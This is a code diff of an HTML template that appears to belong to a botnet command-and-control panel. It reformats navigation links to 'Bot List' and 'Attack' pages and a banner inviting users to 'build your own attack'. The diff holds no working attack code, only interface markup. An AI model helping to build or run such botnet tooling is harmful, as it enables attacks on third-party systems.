@@ -52,30 +52,24 @@
 
     <div class="mdl-layout__drawer">
         <header> <img width="20%" src="/images/bitskull.jpg"></header>
-        <nav class="mdl-navigation">
-            <a class="mdl-navigation__link mdl -navigation__link--current" href="index">
-                <i class="material-icons" role="presentation">dashboard</i>
-                Dashboard
-            </a>
-            <a class="mdl-navigation__link" href="showbot">
-                <i class="material-icons" role="presentation">person</i>
-                Bot List
-            </a>
-            
-                      
-        <a class="mdl-navigation__link" href="attack">
-                <i class="material-icons" role="presentation">&#9760;</i>
-                Attack
-            </a>
+			<nav class="mdl-navigation">
+				<a class="mdl-navigation__link mdl -navigation__link--current"
+					href="../user/index"> <i class="material-icons"
+					role="presentation">dashboard</i> Dashboard
+				</a> <a class="mdl-navigation__link" href="../user/showbot"> <i
+					class="material-icons" role="presentation">person</i> Bot List
+				</a> <a class="mdl-navigation__link" href="../user/attack"> <i
+					class="material-icons" role="presentation">&#9760;</i> Attack
+				</a>
 
-            <div class="mdl-layout-spacer"></div>
-            <a class="mdl-navigation__link" href="https://github.com/xXCiccioXx/BOTNET">
-                <i class="material-icons" role="presentation">link</i>
-                GitHub
-            </a>
-        </nav>
-        
-    </div>
+				<div class="mdl-layout-spacer"></div>
+				<a class="mdl-navigation__link"
+					href="https://github.com/xXCiccioXx/BOTNET"> <i
+					class="material-icons" role="presentation">link</i> GitHub
+				</a>
+			</nav>
+
+		</div>
 
 <main class="mdl-layout__content"></main>
 	<font color="white"><p align="right"><font size="15"><i class="fa fa-rocket" aria-hidden="true"></i></font> <br>User Control Panel: <br><i>build your own attack!</i></p></font>
